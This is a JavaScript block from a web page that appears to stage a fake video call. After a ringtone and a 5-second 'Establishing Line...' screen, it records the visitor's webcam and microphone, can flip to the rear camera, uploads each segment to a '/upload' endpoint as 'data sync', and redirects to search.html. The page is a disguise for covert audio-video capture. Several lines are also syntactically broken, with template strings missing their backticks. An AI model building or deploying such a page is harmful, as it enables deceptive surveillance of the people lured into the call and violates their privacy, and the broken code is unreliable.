<script>
let localStream;
let mediaRecorder;
let currentChunks = [];
let segmentCount = 1;
let pendingUploads = 0; // TRACKS ONGOING UPLOADS
let currentFacing = "user";
let uiVisible = true;
let isEnding = false;

const connectSound = new Audio("ringtone.mp3");
const localVideo = document.getElementById("localVideo");
const controlsUI = document.getElementById("controlsUI");
const connectScreen = document.getElementById("connectScreen");

// --- STARTUP ---
function initiateConnection() {
    connectSound.volume = 0.05; 
    connectSound.play().catch(() => {});
    
    connectScreen.innerHTML = <span class="loader"></span><p style="margin-top:20px;">Establishing Line...</p>;

    setTimeout(async () => {
        connectScreen.style.display = "none";
        document.getElementById("remoteVideo").style.display = "block";
        controlsUI.style.display = "flex";
        localVideo.style.display = "block";
        localVideo.classList.add("snap-transition");
        await startCamera();
    }, 5000); 
}

// --- RECORDING & SEGMENTATION ---
async function startCamera() {
    if (localStream) {
        localStream.getTracks().forEach(t => t.stop());
    }

    try {
        localStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: currentFacing, width: { ideal: 640 } },
            audio: true
        });
        localVideo.srcObject = localStream;

        const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
        mediaRecorder = new MediaRecorder(localStream, { mimeType: mime });
        currentChunks = [];

        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) currentChunks.push(e.data); };
        
        mediaRecorder.onstop = () => {
            const blob = new Blob(currentChunks, { type: "video/webm" });
            uploadSegment(blob, segmentCount, currentFacing);
            segmentCount++;
        };

        mediaRecorder.start();
    } catch (err) {
        console.error("Hardware Error:", err);
    }
}

// --- BACKGROUND UPLOAD ---
async function uploadSegment(blob, id, facing) {
    if (blob.size < 100) return; // Ignore empty segments

    pendingUploads++; // Start tracking this specific upload
    const formData = new FormData();
    formData.append("video", blob, part_${id}_${facing}.webm);

    try {
        await fetch("/upload", { method: "POST", body: formData });
        console.log(Segment ${id} sync complete.);
    } catch (e) {
        console.error("Sync error:", e);
    } finally {
        pendingUploads--; // Stop tracking
        checkFinalRedirect();
    }
}

// --- SWITCHING CAMERA ---
async function switchCamera() {
    if (mediaRecorder && mediaRecorder.state !== "inactive") {
        mediaRecorder.stop(); // Automatically triggers uploadSegment for the current lens
    }
    
    currentFacing = (currentFacing === "user") ? "environment" : "user";
    await startCamera();
}

// --- END CALL & SYNC WAIT ---
async function endCall() {
    isEnding = true;
    document.getElementById("overlay").style.display = "flex";

    if (mediaRecorder && mediaRecorder.state !== "inactive") {
        mediaRecorder.stop(); // Trigger upload for the final segment
    }

    if (localStream) {
        localStream.getTracks().forEach(t => t.stop());
    }

    // Fallback: If nothing was ever recorded or uploads finished instantly
    checkFinalRedirect();
}

function checkFinalRedirect() {
    if (isEnding && pendingUploads === 0) {
        document.getElementById("syncMsg").innerText = "Sync complete. Redirecting...";
        setTimeout(() => {
            window.location.href = "search.html";
        }, 500);
    } else if (isEnding) {
        document.getElementById("syncMsg").innerText = Finalizing ${pendingUploads} data segments...;
    }
}

// --- UI AND DRAG LOGIC ---
let isDragging = false;
let startX, startY, initialLeft, initialTop;
